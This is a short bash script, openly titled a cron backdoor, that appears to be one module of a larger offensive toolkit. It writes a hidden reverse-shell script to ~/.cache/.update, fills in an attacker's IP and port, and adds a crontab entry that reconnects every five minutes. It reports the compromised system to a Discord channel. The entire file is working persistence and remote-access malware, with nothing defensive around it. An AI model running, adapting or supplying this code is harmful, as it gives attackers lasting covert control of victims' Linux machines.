#!/bin/bash
# ============================================================
# Cron Backdoor for Linux - Modular Remote Payload
# ============================================================
# Requires: $IP and $PT for reverse shell persistence
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Cron backdoor failed on $SYSID - Missing IP or PORT"
    exit 1
fi

# Create persistence script
PERSIST_SCRIPT="$HOME/.cache/.update"
mkdir -p "$(dirname "$PERSIST_SCRIPT")"

cat > "$PERSIST_SCRIPT" << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
EOF

sed -i "s/ATTACKER_IP/$IP/g" "$PERSIST_SCRIPT"
sed -i "s/ATTACKER_PORT/$PT/g" "$PERSIST_SCRIPT"
chmod +x "$PERSIST_SCRIPT"

# Add to crontab (runs every 5 minutes)
(crontab -l 2>/dev/null | grep -v ".update"; echo "*/5 * * * * $PERSIST_SCRIPT") | crontab -

send_discord "🔒 **Persistence Installed on $SYSID**\n• Method: Cron (every 5 min)\n• Target: $IP:$PT"

